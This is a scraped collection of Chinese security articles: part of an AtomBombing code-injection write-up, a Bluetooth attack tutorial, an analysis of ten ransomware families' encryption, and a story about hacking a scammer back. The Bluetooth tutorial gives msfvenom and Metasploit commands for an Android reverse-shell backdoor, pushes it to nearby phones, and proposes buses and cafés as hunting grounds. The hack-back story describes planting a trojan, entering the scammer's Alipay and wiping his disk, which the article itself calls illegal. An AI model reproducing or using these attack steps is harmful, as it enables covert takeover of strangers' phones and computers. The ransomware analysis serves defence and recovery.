那么如何使线程进入alertable状态呢？援引自Microsoft：A thread can only do this by calling one of the following functions with the appropriate flags:SleepExWaitForSingleObjectExWaitForMultipleObjectsExSignalObjectAndWaitMsgWaitForMultipleObjectsExWhen the thread enters an alertable state, the following events occur:1    The kernel checks the thread’s APC queue. If the queue contains callback function pointers, the kernel removes the pointer from the queue and sends it to the thread.2    The thread executes the callback function.3    Steps 1 and 2 are repeated for each pointer remaining in the queue.4    When the queue is empty, the thread returns from the function that placed it in an alertable state.https://msdn.microsoft.com/en-us/library/windows/desktop/aa363772(v=vs.85).aspx为了使我们的技术有效，目标进程中必须至少有一个线程处于alertable状态，或者可以在某个时刻进入alertable状态，否则我们的APC将永远不会被执行。我检查了各种软件并且注意到，我检查过的大多数程序都至少有一个alertable线程。示例：Chrome.exe，Iexplore.exe，Skype.exe，VLC.exe，MsPaint.exe，WmiPrvSE.exe等等所以我们现在必须能够在目标进程中找到一个alertable线程。有很多方法都可以实现这一点，这里我选择使用一种琐碎的方法，它可以在大多数情况下工作，并且易于实现和解释。我们给目标进程中的每一个线程都创建一个事件，然后要求每个线程设置其相应的事件。我们会等待有线程去触发它，触发的那个线程就是一个alertable线程。如何设置事件呢？通过调用SetEvent（HANDLE hEvent）就可以。我们如何在目标进程中调用SetEvent？当然可以通过APC。由于SetEvent只接收一个参数，我们可以使用QueueUserApc来调用它。具体的实现细节可以在AtomBombing的GitHub中的main_FindAlertableThread找到。","2016-10-31 15:34:28","Web安全","AtomBombing：全新的Windows代码注入技术","http://nsoad.com/Article/web/20161031/674.html"
"5ccbfad04f2f0a0a7a69c0c7","背景","kong","背景刚接触蓝牙，于是玩了那么一下下，现在分享出来，希望能与大家一起学习先来了解蓝牙哈 (¯▽¯)~（如果哪里错啦，希望大大萌轻点打~(&gt;﹏&lt;)~）初次相识蓝牙是一种低功率，近场通信的通用协议，工作在2.4 – 2.485 GHz，使用扩展频谱，每秒1600跳频（频率每秒改变1600次）跳频了解：http://baike.baidu.com/link?url=0cwODpHwtIpYPP9v1mqnGQrtIfuWwUqhjl5xlXxcwKxI_ga3LwLWrIgkxkv9ZdUX蓝牙范围最小规格为10米，但是制造商在其设备中实现的范围是没有限制（例如加入些放大器）。很多设备的范围可长达100米。只要有特殊的天线，就可以扩大范围。当两个蓝牙设备连接时，这被称为配对（你们懂的Ｏ(≧▽≦)Ｏ）。几乎任何两个蓝牙设备都可以彼此连接。任何可发现的蓝牙设备会传输以下信息：名称类（不知道是不是这么叫 = =）服务列表技术信息当两个设备配对时，它们交换预共享的私钥或连接密钥。每个存储此连接密钥的设备会在将来配对中识别另一个。每个设备都有唯一的48位标识符（类似MAC地址），通常是制造商分配的名称。配对过程如下：另外，蓝牙设备会创建所谓的微微网或非常小的网络。在微微网中，有一个主机和多达七个活动的从机。由于蓝牙使用跳频，这些设备的通信是不会相互干扰的（因为使用相同频率的两个设备的机会非常小）相恋基础蓝牙协议栈大概如下：蓝牙设备不需要使用堆栈中所有协议（如TCP / IP堆栈）。 蓝牙堆栈被开发是为了能够通过各种通信应用使用蓝牙。通常，应用程序只使用该堆栈的一个垂直切片。蓝牙协议层及其相关协议如下：蓝牙核心协议基带：LMP，L2CAP，SDP电缆更换协议：RFCOMM电话控制协议：TCS二进制，AT命令采用的协议：PPP，UDP / TCP / IP，OBEX，WAP，vCard，vCal，IrMC，WAE除了协议层之外，蓝牙规范还定义了主机控制器接口（HCI），这为基带控制器，链路管理器以及硬件状态和控制寄存器的访问提供了命令接口。严防小三蓝牙安全基于几种技术。 首先，跳频。 主机和从机都知道跳频算法，但是其他设备不知道。第二，在配对时交换的用于认证和加密的预共享密钥（128位）。蓝牙有三种安全模式：安全模式1：没有活动安全性安全模式2：服务级别安全。集中式安全管理器处理身份验证，配置和授权。可能未被用户激活。安全模式3：设备级安全。基于密钥的身份验证和加密。爱的抱抱蓝牙协议栈在Linux的实现是BlueZ，大多数Linux发行版都默认安装，如Kali默认安装，BlueZ有一些简单的工具，我们可以用来管理和Hack蓝牙。hciconfig：此工具与Linux中的ifconfig操作非常相似，使用它来启动蓝牙接口（hci0），其次，查询设备的规格。hcitool：这是一个查询工具。 可以用来查询设备名称，设备ID，设备类别和设备时钟。hcidump：可以使用这个来嗅探蓝牙通信爱的考验下面结合metasploit进行蓝牙hack环境：手机开启蓝牙，目标与攻击者处于同一局域网原理：检测到蓝牙开启，向目标发送后门程序，metasploit “肾透支~~~”应用场景：公交车，地铁，咖啡厅等公开共享网络环境 ，pia~~~ (⊙o⊙)一、使用metasploit生成Android后门msfvenom –p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R &gt; ~/fuck.apk打开msf，启动监听use exploit/mutli/handlerset payload android/meterpreter/reverse_tcpset LHOST {ip}set LPORT {port}show optionsexploit二、蓝牙工具查看设备：hciconfig激活设备：hciconfig hci0 up扫描蓝牙设备：hcitool scan若如果对方开启隐藏，可以使用fang工具扫描隐藏的蓝牙设备：：：接下来就是：：：霸王。。。(x_x)（强行连接）blueranger.sh { hciX} { bdaddr }三、发送APK在新版用blueman发送没成，然后用了旧版kali下的bluetooth-sendto进行发送，好了，就等他点击了，即可获得meterpreter ~通过对小米手机测试，成功取得meterpreter经不起考验，那就来个小姐可能有人觉得，发送apk还要安装运行，会比较难利用，但是我觉得，如果是在一些公共场合，再结合其他环境。。。例如：公交车（或者其他地点） +  双十一  ~ 然后，就没有了然后→_→_→_→","2016-11-18 15:29:27","无线安全","蓝牙攻击-基础篇","http://nsoad.com/Article/wifi/20161118/805.html"
"5ccbfad04f2f0a0a7a69c0c8","勒索软件(ransomware)是一种运行在计算机上的恶意软件，通过绑架用户文件，使用户数据资产或计算资源无法正常使用，并以此为条件向用户勒索钱财。","Kong","1、引言1.1勒索软件勒索软件(ransomware)是一种运行在计算机上的恶意软件，通过绑架用户文件，使用户数据资产或计算资源无法正常使用，并以此为条件向用户勒索钱财。这类用户数据资产包括文档、数据库、源代码、图片、压缩文件等多种文件。赎金形式通常为比特币，少数为真实货币或其他虚拟货币。按照已有资料考证，早在1989年，第一款勒索软件就已经问世，但这与本文内容关系不大，不做讨论。而近期的勒索软件是从2012年开始流行，并于    2013年引起了广泛的重视。截止至当前，勒索软件的受害者已有上千万用户，这也使得勒索软件日益猖獗。1.2本文内容考虑到勒索软件所造成的深远影响，有必要写一些既可以给广大非技术人员了解勒索软件和加密算法又可以帮助技术人员深入分析的文章。笔者将自己近期在勒索软件方面的工作进行整理和汇总，并挑选出10款比较有代表意义的勒索软件进行深入探讨。需要注意的是，本文着重讨论10款勒索软件样本的加密算法，而对其各自的加壳方法、反沙箱手段、提权方法和隐藏手段等不做讨论。所以本文定位于介绍这些勒索软件加密算法到底是怎样的，是否可以将其解密等相关问题。而其他的，诸如DLL    注入等问题，还是留给其他人再做分析吧。出于让更多非技术人员读懂的目的，笔者倾向于用更通俗的语言和描述来整理勒索软件中的各种问题，但这可能导致一些不严谨或是不准确的地方，还请技术人员领会大意即可。最后，笔者由衷地希望通过本文，可以帮助更多的受害者认识勒索软件，理性对待被加密的文件。也希望可以缩短其他技术人员的分析时间，提高分析效率。但限于笔者个人知识有限，才疏学浅，文中不当或错误之处还请各位读者包容和指正。1.3行文结构本文第一章为介绍本文的文字，读者可以通过第一章自行判断本文讨论的内容是否与读者需要的内容相关；第二章开始逐一介绍各个样本的加密算法；第三章则分析勒索软件被破解的原因，当然还有更多的勒索软件未能破解；第四章就目前勒索软件的发展趋势给出笔者自己的意见。2、样本分析从本章节开始，笔者将向各位读者逐一介绍各种勒索软件，被展示出来的10款勒索软件按字母顺序排序。针对每一款勒索软件着重介绍其加密流程，如需关注其他方面，可以单独找些相应的资料。此外，各个勒索软件除了加密算法之后，还有大量的Hash算法，由于这类Hash算法会增加理解难度，所以在本文之中一概将其省略    。有兴趣的读者可以自行分析其中的各种Hash算法。2.1 Apocalypse2.1.1Apocalypse概述Apocalypse勒索软件出现于2016年6月份，在得到广泛传播之前，就已经被破解了。但是笔者仍然决定把这款勒索软件拿出来进行分析，因为它同样可以作为某一类勒索软件加密算法的代表。一个被    Apocalypse勒索软件加密的文件夹内容如下：从图中可以看到很明显的特征，所有被加密的文件都以.encrypted为扩展名，并生成了一个与其名称很类似的.txt文件，用于提醒用户感染了    Apocalypse勒索软件并索要赎金。2.1.2Apocalypse加密流程与其他所有勒索软件不同，Apocalypse勒索软件使用了一种其自定义的加密算法，并将其密钥也内置在样本之中：其中，dl存着这该样本使用的密钥，cl为计数器。完成加密之后，将加密内容复写入用户文件，并更改其后缀名便完成其加密过程。2.1.3Apocalypse解密流程通过Apocalypse的加密算法，可以了解到其自定义加密算法为一种对称加密算法。所以，其解密算法与加密算法是完全相同的。关于对称加密算法的更多细节，可以在wiki上找到：https://en.wikipedia.org/wiki/Symmetric-key_algorithm2.2 Cerber2.2.1Cerber概述Cerber勒索软件是2016年3月份开始广泛传播的。被    Cerber加密的用户文件扩展名为Cerber，截止至笔者书写此章节（2016年    9 月）时，最新的Cerber版本已出现了Cerber2扩展名，可以通过其扩展名判断其从属于        Cerber 系列。本节所分析的Cerber勒索软件样本并非是最新样本，如需对最新的加密样本感兴趣，读者可以自行分析。此外，被Cerber勒索软件感染之后，每个目录下还会生成额外的3个文件：# DECRYPT MYFILES #.txt    、# DECRYPT MY FILES #.html、# DECRYPT MY FILES #.vbs，    这三个文件的作用就是提示用户已经感染了 Cerber勒索软件，并索要赎金。一个感染了Cerber勒索软件的文件夹内容如下图：2.2.2Cerber加密流程Cerber勒索软件的加密算法为RSA算法与RC4算法。其加密流程较为复杂，这里无法完全展示出来，只讨论几处关键点。关于    RSA算法和RC4算法的更多细节可以在wiki上找到：RSA :  https://en.wikipedia.org/wiki/RSA_(cryptosystem)RC4 :  https://en.wikipedia.org/wiki/RC4粗略地讲，Cerber采用三层加密方法：首先，用内置RSA密钥加密随机RSA    密钥；然后，利用随机RSA密钥加密随机RC4密钥；最后，利用随机RC4    密钥加密用户文件。每个Cerber样本都内置了一份配置文件，该被加密存储在Cerber样本的资源段中，将其解密后可以发现一个RSA    公钥，截图如下：此时，RSA公钥被base64编码了，使用时需要进行base64    解码。利用该RSA公钥加密一对随机的RSA密钥。进而，利用这随机生成的RSA    密钥加密随机的RC4密钥。这随机的RC4密钥即为加密用户文件的最终密钥，其加密用户文件的RC4    算法核心代码如下： 此外，需要指出的是Cerber勒索软件并非对完整的用户文件进行加密，而是随机的把用户文件分为了几部分，并选择其中的一部分进行加密。在Cerber最终生成的文件比原用户文件大一些，其中保留了分块信息等其他在解密是需要使用到的密钥信息。2.2.3Cerber解密流程如果可以正确理解Cerber勒索软件的加密算法，那么就不难得出Cerber的解密算法。当忽略一些细节问题之后，其解密算法可以概述如下，首先从攻击者    C&amp;C服务器获取RSA私钥，用该私钥解密RC4算法的密钥，进而利用    RC4 密钥解密用户文件即可。2.3 CryptoWall2.3.1CryptoWall概述CryptoWall是一款在国外广泛传播的勒索软件，在2014年出现了CryptoWall的第一个版本，截止至笔者书写本小节时，    CryptoWall勒索软件的最新版是第4版。本章节以CryptoWall的第三个版本为分析样本，一个感染了    CryptoWall的目录截图如下：其中，文件扩展名为随机生成的3个字符。而文件夹内额外生成的3个文件为：HELP_DECRYPT.HTML    、HELP_DECRYPT.PNG、HELP_DECRYPT.TXT，这3    个文件主要用于提示用户本机已感染了 CryptoWall勒索软件，并向用户索要赎金。2.3.2CryptoWall加密流程CryptoWall实现加密的方法为RSA算法和AES算法，其加密过程主要依靠微软提供的    CryptAPI实现。由于CryptoWall加密公钥需要从攻击者C&amp;C服务器中获取，而攻击者的几个    C&amp;C服务器很快就躺了，这在某种程度上抑制了CryptoWall的传播。关于AES算法和CryptAPI的更多细节可以在wiki    上找到：AES : https://en.wikipedia.org/wiki/Advanced_Encryption_StandardCryptoAPI : https://en.wikipedia.org/wiki/Microsoft_CryptoAPI正如之前所述，CryptoWall从C&amp;C服务器获取RSA    公钥，用该公钥加密随机生成的AES密钥：进而，通过随机生成的AES密钥加密受害者用户文件：并将被加密的用户文件和其他的额外信息一同写入最终生成的文件中。2.3.3CryptoWall解密流程CryptoWall勒索软件的解密过程与加密过程是及其相似的，第一步同样是从攻击者C&amp;C服务器获取密钥，不过这次获取的是RSA    私钥。然后用该私钥解密AES密钥。针对每个用户文件都有一个随机的AES私钥，通过该    AES 密钥解密最终的受害者用户文件即可。2.4 CTB_Locker2.4.1CTB_Locker概述CTB_Locker勒索软件同样于2014年开始传播，被CTB_Locker勒索软件加密的用户文件具有相同的扩展名，均为随机的    7个字母文后缀。一个被CTB_Locker勒索软件加密的用户文件夹如下：其中，最后两个文件分别以图片和文本的形式提示用户感染了CTB_Locker勒索软件，并要求支付赎金。2.4.2CTB_Locker加密流程CTB_Locker勒索软件的加密算法比较完善，也比较复杂，与Cerber类似，本小节选择用不严谨地语言描述其完整的加密算法，专业人员读到此处时，理解笔者的意思即可，不要做太深的推敲。CTB_Locker勒索软件加密用户文件的所用算法主要是AES算法和ECDH算法。其    ECDH算法选用curve25519曲线。关于ECDH算法和curve25519曲线的更多细节可以在wiki    上找到：ECDH : https://en.wikipedia.org/wiki/Elliptic_curve_Diffie%E2%80%93Hellmancurve25519 : https://en.wikipedia.org/wiki/Curve25519必须指出的是，ECDH是一种密钥协商算法，但对于非技术人员，理解这种算法是有困难的。所以，笔者姑且将ECDH算法比作RSA算法    ，这种类比虽然不是完全正确，但是可以很好地帮助我们理解勒索软件。CTB_Locker勒索软件的加密过程可以粗略地理解为3层加密，第一层是运用内置在样本中的公钥通过ECDH算法加密随机生成的    ECDH密钥：上图中的PblKey即为随机生成的ECDH密钥；进而第二层的结果通过随机生成的ECDH    密钥加密随机生成的AES密钥；第三层为通过随机生成的AES密钥加密用户文件。 最后，将加密之后的用户文件，以及解密时需要用到的其他额外信息覆盖保存于用户文件。2.4.3CTB_Locker解密流程CTB_Locker勒索软件的正常解密流程是无法获得其主密钥的，即正常的CTB_Locker勒索软件的解密流程只包含两层，首先，通过从攻击者C&amp;C    服务器拿到的关于随机生成的ECDH密钥相关信息，通过ECDH算法获得随机生成的AES    密钥；进而，通过该随机生成的 AES密钥解密用户文件即可。2.5 Jigsaw2.5.1Jigsaw概述Jigsaw勒索软件也是一款.net托管类勒索软件，并与2016年    4月开始流传。关于.net框架的更多相关信息，可以在wiki上找到：.net framework : https://en.wikipedia.org/wiki/.NET_Framework截止至笔者书写此章节是，Jigsaw勒索软件出现了2个版本，本小节分析的Jigsaw    勒索软件为第一个版本，其特征是被加密的用户文件以.fun为后缀。一个被Jigsaw勒索软件加密的文件夹如下：此外，Jigsaw勒索软件并未生成额外的其他文件用于提醒用户，仅仅生成了一个窗口，显示了索要赎金等相关信息。2.5.2Jigsaw加密流程Jigsaw勒索软件选用AES算法作为其加密算法，其加密密钥和初始向量被编码存储于样本中：Jigsaw勒索软件对文件的加密过程也是一目了然的，先是读取目标文件内容，然后加密，最后写入目标文件，即可完成其完全流程：最后在增加一个文件名后缀，即完成了其加密流程。2.5.3Jigsaw解密流程Jigsaw勒索软件自身携带了其解密算法，当选择解密时，该软件会首先查询是提交了赎金。如果已经提交，那么则以加密时使用的密钥和初始向量完成解密流程；如果没有提交赎金，则继续计时。2.6 Locky2.6.1Locky概述Locky勒索软件是另一款需要从C&amp;C服务器申请公钥的勒索软件，是2016年        2月开始传播，由于Locky需要从攻击者的C&amp;C服务器申请公钥，而        C&amp;C 服务器很快就挂掉了，使Locky无法与其C&amp;C服务器进行通信，导致无法申请到密钥，所以就不会继续运行下去。截止至笔者书写本章时，已出现了多款不同的Locky版本，不同版本的Locky略有不同，这里选择了一个早期的        Locky 版本，一个感染了Locky勒索软件的文件夹如下：其中，_HELP_instructions.bmp和_HELP_instructions.html是Locky        勒索软件生成的，用于提示用户感染了Locky并索要赎金。2.6.2Locky加密流程Locky勒索软件选用RSA算法和AES算法作为其加密算法。但不同的样本对        AES和RSA的实现略有不同，本小节分析的样本中，其RSA算法使用微软提供的        CryptAPI 实现：其中，RSA算法用于加密随机生成的AES密钥，RSA        算法的公钥在Locky勒索软件运行时从攻击者C&amp;C服务器中获取。AES        算法用于加密受害者的用户文件，其主要由 aesenc指令实现，该指令具有较高的执行效率：完成加密之后，会将相关的信息与被加密的文件内容一同写入用户文件。2.6.3Locky解密流程Locky勒索软件的解密算法相对比较简单，首先需要从攻击者C&amp;C服务器中拿到RSA私钥，用于解密        AES密钥，进而使用AES密钥完成用户文件的解密工作即可，此外，需要删除用户文件中额外的保留信息。2.7 Petya2.7.1Petya概述Petya勒索软件于2016年3月开始流传。与其他勒索软件不同的是，        Petya勒索软件并不对用户文件本身下手，其主要的恶意功能可概述为两点：其一，破坏计算机的主引导代码，使不能启动windows操作系统；其二，加密主文件表，使文件不能被访问。关于主引导代码和主文件表的更多描述可以在        wiki 中找到：MBR : https://en.wikipedia.org/wiki/Master_boot_recordNTFS MFT : https://en.wikipedia.org/wiki/NTFS#InternalsPetya勒索软件还有一款名为Mischa的改进版本，本小节以Petya勒索软件为分析样本。一个感染了        Petya勒索软件的计算机开机后，会显示如下内容：其内容主要是提示用户感染了Petya勒索软件并索要赎金。2.7.2Petya加密流程Petya勒索软件的加密算法并不复杂，可简述为ECDH算法和SALSA20算法。其中，        ECDH算法采用secp192k1曲线，用于加密SALSA20算法的密钥。关于        SALSA20 算法的更多描述可以在wiki中找到：SALSA20 : https://en.wikipedia.org/wiki/Salsa20为了帮助更多的读者理解，本节中同样把ECDH算法类比为RSA算法，感兴趣的读者可以在此基础之上继续深入研究。下图展示了调用        secp192k1加密随机生成SALSA20密钥的截图：而SALSA20算法用于加密主文件表，该算法运行在操作系统引导之前的16位环境之中，截图为引导程序调用        SALSA20 算法：当完成上述加密步骤之后，程序会显示出其勒索页面并索要赎金。2.7.3Petya解密流程Petya勒索软件的解密算法仅包含一步，即从攻击者C&amp;C服务器中拿到SALSA20的密钥，用之解密主文件表，最后将引导区还原为正常引导，即可完成其解密流程。2.8 TeslaCrypt2.8.1TeslaCrypt概述TeslaCrypt勒索软件是在2015年2月首次出现。截止至笔者书写此章节时，        TeslaCrypt总共有4个主要版本。不同版本的TeslaCrypt加密样本，拥有不同的扩展名，如        .ecc、.ezz、.zzz、        .vvv 、.abc等等。本文选择TeslaCrypt的第四个版本进行分析，其加密之后的文件名没有任何变化，一个感染了            TorrentLocker 勒索软件的文件夹内容如下图：其中，-!RecOveR!-yjxka++.Htm和-!RecOveR!-yjxka++.Png以及-!RecOveR!-yjxka++.Txt        用于提示用户干扰了TeslaCrypt勒索软件，要求支付赎金。2.8.2TeslaCrypt加密流程不同版本的TeslaCrypt勒索软件所用的加密算法也略有不同，与CTB_Locker勒索软件类似的是，本小节分析的        TeslaCrypt版本使用得同样是ECDH和AES两种，但其        ECDH 选用的secp256k1曲线。同样的，为了让更多的非技术人员可以理解本小节所述的内容，本小节同样将ECDH算法类比为RSA算法。专业人员读到此处时，领会大意即可。粗略地，TeslaCrypt勒索软件同样采用三层加密方法，第一层中，使用样本中内置ECDH公钥加密随机生成的        ECDH 密钥。第二层中，使用随机生成的ECDH密钥加密随机生成的AES密钥：第三层中，使用随机生成的AES密钥加密用户文件：加密完成之后，TeslaCrypt会将被加密的内容覆盖写入用户文件，解密需要用到的相关信息也一同被保存在其中。2.8.3TeslaCrypt解密流程与CTB_Locker勒索软件相同，正常情况下是无法获取TeslaCrypt勒索软件的主密钥，所以其解密过程只包括两步，分别是通过            ECDH算法获得AES密钥，进而使用该AES密钥解密用户文件即可。2.9 TorrentLocker2.9.1TorrentLocker概述TorrentLocker勒索软件是在2014年开始兴风作浪。TorrentLocker勒索软件的绝大部分版本都以            .encrypted为扩展名，但不同版本的TorrentLocker最终加密文件格式略有不同。本章节选取TorrentLocker            早期的一个版本进行分析，该样本加密用户文件之后，并不会改变原用户文件的体积，这一点可用于区分该版本与其他版本的 TorrentLocker勒索软件。一个感染了TorrentLocker勒索软件的文件夹内容如下图： 其中，PLEASE_READ.txt为TorrentLocker勒索软件自动生成的。被            TorrentLocker勒索软件感染之后，每个目录下还会生成该文件，用于提示用户感染了TorrentLocker勒索软件，显示解密相关的信息。2.9.2TorrentLocker加密流程TorrentLocker勒索软件选用RSA和AES作为加密算法。其中            RSA算法用于加密AES密钥，AES算法用于加密用户文件。            AES 密钥通过Yarrow算法随机生成，关于Yarrow算法的具体描述可以在                wiki中找到：Yarrow algorithm :https://en.wikipedia.org/wiki/Yarrow_algorithmTorrentLocker勒索软件的随机过程中，随机种子涉及到多个函数的返回值，如下图：截图内容不全，部分函数未能展示出来。最终加密用户文件部分入如图：每次加密0×10字节，直至结尾。2.9.3TorrentLocker解密流程需要指出的是，在TorrentLocker样本中，所有用户文件被同一AES密钥加密。在解密过程中，需要从            攻击者 C&amp;C服务器获取AES密钥，通过该密钥即可解密所有的用户文件。2.10 Unlock922.10.1Unlock92概述Unlock92勒索软件于2016年6月开始流行，截止至笔者书写此章节时，已出现了若干个版本的            Unlock92勒索软件，该勒索软件加密用户文件之后，会增加不同的扩展名，其中以.CRRRT为后缀和以.CCCRRRPPP            为后缀的版本较为流行。相对于前者，后者的加密方法更科学，更严谨。本节选用以 .CCCRRRPPP为后缀的Unlock92勒索软件为分析样本。Unlock92是一款.net托管类勒索软件，感染了Unlock92的用户文件夹如下： 其中，FBDX.jpg为勒索软件自动生成的图片文件，该名称不固定，图片内容为提示用户已经感染了Unlock92勒索软件。2.10.2Unlock92加密流程Unlock92勒索软件采用的勒索软件为两次RSA算法，每个Unlock92勒索软件都内置一个                RSA公钥，如下图： 该公钥用于加密一个随机生成的RSA私密。而这个随机生成的RSA公私密钥对，用于加密用户的全部个人文件：需要指出的是，由于RSA算法运行速率较慢，Unlock92的作者并未对完整的用户文件全部进行加密，而是选择每个用户文件的前                    0×300字节进行加密。2.10.3Unlock92解密流程根据Unlock92的加密过程，不难得出其解密算法。首先需要从攻击者手中拿到对应于样本内置RSA公钥的私钥，然后通过拿到的私钥解密随机                    RSA私钥，最后用解密的来的RSA私钥解密用户文件即可。3、破解原因3.1加密流程总结在上文中，已经概括地介绍了各个勒索软件的加密流程。而这10种勒索软件被选出并展示的主要原因在于他们可以分别代表某一类加密流程。而这10个不同的勒索软件，就涵盖了                    10种不同的加密流程。其他的勒索软件的加密流程也不外乎是这十种之中的某一种。这里在重新归纳一下各种加密算法：1. 使用自定义加密算法，如2.1章节所述的勒索软件等。2. 使用一层加密算法，如2.5章节所述的勒索软件等。3. 使用二层加密算法，RSA+AES等，如2.9章节所述的勒索软件等。4. 使用三层加密算法，ECDH+ECDH+AES等，如2.2章节所述的勒索软件等。5. 借用其他正常软件的加密功能，如：CryptoHost 勒索软件借用winrar的加密功能、Vault勒索软件会借用gnupg的加密功能等等。笔者并未在本文中分析此类样本，因为这与勒索软件使用的加密算法关系不大。                                                        在所有的标准加密和解密算法之中，AES算法的使用率是最高的，而RSA算法次之，                    ECDH 算法同样被一部分勒索软件采用。这些标准的加解密算法，可以认为其本身是不可解的，而造成其可解的原因完全是因为使用不当，这也是勒索软件被破解的主要原因。 3.2破解原因概括勒索软件被破解的主要原因并不在于其加密算法不科学，而主要原因是未能正确使用其加密算法。目前，勒索软件被破解的原因可以归纳为以下几点：1. 自定义算法，通过加密算法可以直接得到解密算法。在本文中第2.1章节所述的勒索软件即存在该问题。2. 密钥保存方法不合适，如使用固定AES密钥加密用户文件。在本文中第2.5章节所述的勒索软件即存在该问题。3. 加密强度不够，如RSA密钥长度不够，使得其被质数分解。在本文中第2.8章节所述的勒索软件的早期版本存在该问题。4. 伪随机数生成算法不科学，使得可以预测密钥。在本文中第2.10章节所述的勒索软件的早期版本存在该问题。5. 攻击者C&amp;C服务器有漏洞，通过该漏洞可以获取密钥。在本文中第2.2                    章节所述的勒索软件的早起版本存在该问题。                除了以上5点之外，还存在一些其他的原因可是实现破解勒索软件，但由于这些原因不具有通用性(比如，                    CoinVault勒索软件的作者被抓、TeslaCrypt主动放出密钥等)                    ，这里就不再介绍了。                4、趋势与建议4.1趋势按照笔者所了解的情况来看，目前勒索软件的种类和数量都有增多趋势。不仅如此，在黑市上已开始贩卖勒索软件的制作工具和勒索软件源代码。如果不采取有效措施遏制勒索软件的增长趋势，很难评估勒索软件最终会壮大到何种地步。不过，反勒索软件的阵营也在不断成长，各种反病毒公司先后推出了对抗反病毒的软件与工具，在防范勒索软件的方法也不断的更新迭代，相信很快就会取得更丰硕的成果。4.2建议过去的勒索软件对于各种加解密算法的使用，或多或少的都存在一些问题。但随着勒索软件的版本更新，这些问题越来越少。一旦勒索软件的作者完全掌握了正确地使用这些加解密算法时，按目前的计算水平来看，想还原这些被加密的文件可以认为是不可能的。所以，针对于勒索软件的问题，笔者建议是以防范为主。即时地备份自己的个人文件，对于一些关键的文件，更要采取一些额外的手段进行保护。而一旦真的感染了勒索软件也不要惊慌，更不要盲目的购买并支付比特币，咨询一些专业人员可以得到更为科学的处理手段。此外，可以针对勒索软件的主要特征订制一些防御手段，如设置蜜罐文件等。相信通过这些方式可以有效地遏制勒索软件的传播。ps：笔者目前处于无业状态，欢迎介绍工作。","2016-11-28 11:50:02","网络安全","分析与总结常见勒索软件的加密算法","http://nsoad.com/Article/Network-security/20161128/855.html"
"5ccbfad04f2f0a0a7a69c0c9","不知道各位差友有没有遇到过网络诈骗？除了骗老年人偏多的电信诈骗，最近骗子们又盯上了各个公司的财务人员。。。","差评君","不知道各位差友有没有遇到过网络诈骗？除了骗老年人偏多的电信诈骗，最近骗子们又盯上了各个公司的财务人员。。。类似事件的新闻截图这些骗子主要靠伪装公司高管建群，组团诱骗公司财务人员汇款，已经发生了好多起案件了。这不，前阵子，差评君的一个哥们就遇到了这样的诈骗，不凑巧的是这哥们是个黑客（此处指代白帽子，正义黑客）老司机，狠狠套路了骗子一波。。。事情的经过是这样的，老司机收到了一封奇怪的邮件。这浓浓的山寨气息，也太他妈简陋了吧，骗子这么不敬业么？（不排除是故意的，用来筛选被骗的人的智商。。。）老司机一眼就看出事情有问题，本来没想理这个，不过闲的蛋疼的他突然觉得，反正也是无聊，不如去看看骗子的套路，于是他弄了个QQ小号，假装财务加了群。从入群问题，可以看出骗子的套路，因为骗子要问 “ 公司名称 ”，看起来这个验证没毛病，但多半是因为骗子邮件是广撒网，根本不知道目标公司名是啥，所以在这埋了一波套路。。。老司机很懂事的输入了公司全名提交，坐等骗子的下一波套路~过了大概 20 分钟之后，骗子通过了入群申请，可能是做了一些准备工作。群里人的备注名字跟公司高管的真实名称一模一样！多半是这些骗子通过公司名字查了企业信用公示信息，以便更好骗人。。。然后这些 “ 高管 ” 假装谈论了一些很有高度的业务上的事情，突然话锋一转，问会计公司账户余额~作为一个 “ 单纯的会计”，老司机表现的很乖，说什么答什么。（当然是瞎编的~）直接就报公司余额看到账上有钱，骗子也没客气，直接就让老司机打款。。。 而且骗子特意强调了 “ 急用 ”，“ 手续后补”，诈骗意图已经很明显了！然后老司机开始了对骗子的套路，既然不能签字，可以电子审批啊~要求骗子 “ 电子审批”这个什么审批程序，其实是老司机刚截获准备分析之后提交给安全厂商的木马病毒样本。。。病毒被上传之后，被一心骗钱猴急的不行的骗子秒速下载，老司机都笑疯了，头次见这么配合工作点病毒的！而且还被下载了两次！（群管理秘籍是什么鬼？这骗子是传销转行过来的么？）几分钟之后，骗子应该把病毒装好了，病毒客户端显示有主机上线~骗子的主机已经被控制通过IP地址大概了解到了片子的位置信息。其中一个参考数据竟然精确到了房间号你怕不怕！？通过木马，老司机看到了骗子电脑上各种各样的文件，还顺手下载了一波~（有兴趣的差友可以点开看大图）老司机发现骗子的电脑里有各种各样人名相关的表格和 txt，还有个名字叫 “ 卡.txt” 的文件点开之后，发现是骗子用来收款的银行卡号。。。老司机还意外的发现了骗子的支付宝，通过骗子电脑上存储的个人信息，成功登陆了上去。。。虽然有核验，但骗子把详细身份信息什么的都存储到了电脑上老司机在交易记录里发现了一笔充值往来款。显示充值给了一个 “ 企查查 ” 的软件，这个软件是干嘛用的呢？企查查是一个专门用来查询企业相关信息的软件，骗子多半是在骗取公司名称之后跑到这里查到了高管的名字，依次打造了 “ 假群”，来骗钱。企查查（注：为了防止明天企查查的公关找上门，差评君跟大家解释一下，这种服务是完全合法的。。。）仔细整理了骗子材料之后，老司机发现骗子是有一整套 “ 话术 ” 方案的，专门用来对话中的诱骗，专业的不行。。。话术截图到此，老司机已经彻底摸清了骗子从头到尾的套路，为了防止骗子继续坑人，做了一件替天行道的事情~远程格式化了骗子的硬盘分区。。。不大一会，老司机被反应过来的骗子踢了。。踢了。。。！也是无情，当初是你非要让我进来的呀，现在还踢我？故事到这里就结束了，差评君希望这件事能给各位差友带来一些警示作用，毕现在套路那么深，所以找了一个做信息安全领域的老朋友，是 i春秋安全学院的，安全老中医给大家提了一下建议：1.邮件上的东西不能完全相信，最好电话确认，同时别乱点里面的链接，同时要核准发件人的邮箱！2.金额巨大还要求不走正规流程的交易几乎都是耍流氓，碰到这种尽量电话/视频确认，实在不行公司内部人员可以设置个接头暗号啥的。3.别把自己的个人关键信息明文存在电脑上，要不然骗子的支付宝账户也不会被登陆了！4.别他妈瞎点别人传过来的文件！这骗就是个悲剧的例子！！！5.差评君的这个 “ 老司机 ” 朋友做的事情其实是违法的，无论出于什么目的，都不能在未获得授权时入侵并控制其他人的计算机，技术不可以被滥用，无论正不正义都不行，要守法！6.咳咳，我能顺路打个广告么？我们i春秋上可以通过浏览器免费申请一个网络安全实验（有300多个），我们给你提供了实验操作手册、实验系统环境和。。哎哎，你怎么打人？。。。（因为打广告现已被差评君拖出去吊打~）差评君对这件事想说，现在社会套路那么深，各种技术也很可怕，一定一定要提高警惕多提防，没事多看看差评涨智商！【本文转自微信公众号：差评  作者：差评君   